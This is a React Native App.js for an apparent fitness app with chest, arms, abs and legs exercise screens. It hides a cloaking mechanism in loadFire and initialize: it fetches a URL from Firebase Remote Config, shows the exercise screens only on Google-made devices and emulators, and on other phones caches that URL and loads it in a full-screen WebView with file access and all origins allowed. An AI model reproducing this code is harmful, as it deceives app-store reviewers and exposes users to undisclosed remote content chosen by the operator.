import React, {useEffect, useState, useRef} from 'react';
import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {
  StyleSheet,
  View,
  BackHandler,
  Image,
  TouchableOpacity,
  Dimensions,
} from 'react-native';
import remoteConfig from '@react-native-firebase/remote-config';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import {getManufacturer} from 'react-native-device-info';
import OneSignal from 'react-native-onesignal';
import {ExerciseScreen} from './src/screens/ExerciseScreen';
import {ChestScreen} from './src/screens/ChestScreen';
import {ArmsScreen} from './src/screens/ArmsScreen';
import {AbsScreen} from './src/screens/AbsScreen';
import {LegsScreen} from './src/screens/LegsScreen';
import {ChestDescr} from './src/screens/Descriptions/ChestDescr';
import {ArmsDescr} from './src/screens/Descriptions/ArmsDescr';
import {AbsDescr} from './src/screens/Descriptions/AbsDescr';
import {LegsDescr} from './src/screens/Descriptions/LegsDescr';

import WebView from 'react-native-webview';

const Stack = createNativeStackNavigator();

export default function App() {
  const [showWebView, setShowWebView] = useState('');
  const [visible, setVisible] = useState(true);
  const [canGoBack, setCanGoBack] = useState(false);
  const webViewRef = useRef(null);
  const ActivityIndicatorElement = () => {
    return (
      <View style={styles.activityIndicatorStyle}>
        <Image
          style={styles.loadingPage}
          source={require('./src/assets/Load/leon_loading.png')}
        />
      </View>
    );
  };
  useEffect(() => {
    const handleBack = () => {
      return true;
    };
    const backHandler = BackHandler.addEventListener(
      'hardwareBackPress',
      handleBack,
    );
    return () => backHandler.remove();
  }, []);

  useEffect(() => {
    BackHandler.addEventListener('hardwareBackPress', HandleBackPressed);
    return () => {
      BackHandler.removeEventListener('hardwareBackPress', HandleBackPressed);
    };
  }, [canGoBack]);

  const HandleBackPressed = () => {
    if (canGoBack && webViewRef.current) {
      webViewRef.current.goBack();
      console.log(webViewRef.current.goBack())
      return true;
    }

    return false;
  };

  const loadFire = async () => {
    setVisible(true);
    try {
      const storageUrl = await AsyncStorage.getItem('key');
      if (storageUrl) {
        setShowWebView(storageUrl);
        setTimeout(() => {
          setVisible(false);
        }, 2000);
        return;
      }
      const remoteValue = await initialize();
      const brand = await getManufacturer();
      const isBrandGoogle = brand === 'google';
      // console.log(remoteValue, isBrandGoogle, DeviceInfo.isEmulatorSync());
      if (!remoteValue || isBrandGoogle || DeviceInfo.isEmulatorSync()) {
        setTimeout(() => {
          setVisible(false);
        }, 2000);
        return;
      } else {
        await AsyncStorage.setItem('key', remoteValue);
        setShowWebView(remoteValue);
        setTimeout(() => {
          setVisible(false);
        }, 2000);
      }
    } catch (e) {
      setTimeout(() => {
        setVisible(false);
      }, 3000);
    }
  };

  const initialize = async () => {
    await remoteConfig().setConfigSettings({
      isDeveloperModeEnabled: __DEV__,
    });
    await remoteConfig().setDefaults({
      url: '',
    });
    await remoteConfig().fetch(10);
    const activated = await remoteConfig().fetchAndActivate();
    console.log(activated);
    const remoteUrl = remoteConfig().getString('url');
    console.log(remoteUrl);
    return remoteUrl;
  };

  useEffect(() => {
    loadFire();
    OneSignal.setAppId('a47c4b57-a04f-49ff-9994-ca2ff715fb39');
    OneSignal.setNotificationOpenedHandler(notification => {
      console.log('OneSignal: notification opened:', notification);
    });
  }, []);
  const ChestScreens = () => {
    return (
      <Stack.Navigator
        screenOptions={{
          headerShown: false,
        }}>
        <Stack.Screen name="ChestScreen" component={ChestScreen} />
        <Stack.Screen name="ChestDescr" component={ChestDescr} />
      </Stack.Navigator>
    );
  };

  const ArmsScreens = () => {
    return (
      <Stack.Navigator
        screenOptions={{
          headerShown: false,
        }}>
        <Stack.Screen name="ArmsScreen" component={ArmsScreen} />
        <Stack.Screen name="ArmsDescr" component={ArmsDescr} />
      </Stack.Navigator>
    );
  };

  const AbsScreens = () => {
    return (
      <Stack.Navigator
        screenOptions={{
          headerShown: false,
        }}>
        <Stack.Screen name="AbsScreen" component={AbsScreen} />
        <Stack.Screen name="AbsDescr" component={AbsDescr} />
      </Stack.Navigator>
    );
  };

  const LegsScreens = () => {
    return (
      <Stack.Navigator
        screenOptions={{
          headerShown: false,
        }}>
        <Stack.Screen name="LegsScreen" component={LegsScreen} />
        <Stack.Screen name="LegsDescr" component={LegsDescr} />
      </Stack.Navigator>
    );
  };

  if (!showWebView && !visible) {
    return (
      <NavigationContainer>
        <Stack.Navigator
          screenOptions={{
            headerShown: false,
          }}>
          <Stack.Screen name="ExerciseStack" component={ExerciseScreen} />
          <Stack.Screen name="ChestScreens" component={ChestScreens} />
          <Stack.Screen name="ArmsScreens" component={ArmsScreens} />
          <Stack.Screen name="AbsScreens" component={AbsScreens} />
          <Stack.Screen name="LegsScreens" component={LegsScreens} />
        </Stack.Navigator>
      </NavigationContainer>
    );
  }
  return (
    <View style={styles.container}>
      <WebView
        source={{uri: showWebView}}
        style={{flex: 1, width: '100%', height: '100%'}}
        allowFileAccess={true}
        scalesPageToFit={true}
        originWhitelist={['*']}
        ref={webViewRef}
        onLoadProgress={event => setCanGoBack(event.nativeEvent.canGoBack)}
      />
      {visible ? <ActivityIndicatorElement /> : null}
    </View>
  );
}
const styles = StyleSheet.create({
  container: {
    backgroundColor: '#F5FCFF',
    flex: 1,
  },
  activityIndicatorStyle: {
    flex: 1,
    position: 'absolute',
    marginLeft: 'auto',
    marginRight: 'auto',
    marginTop: 'auto',
    marginBottom: 'auto',
    left: 0,
    right: 0,
    top: 0,
    bottom: 0,
    justifyContent: 'center',
  },
  loadingPage: {
    width: '100%',
    height: '100%',
  },
  startPage: {
    width: 350,
    height: 350,
  },
  startContainer: {
    height: Dimensions.get('window').height,
    width: Dimensions.get('window').width,
    justifyContent: 'center',
    alignItems: 'center',
    position: 'absolute',
  },
});
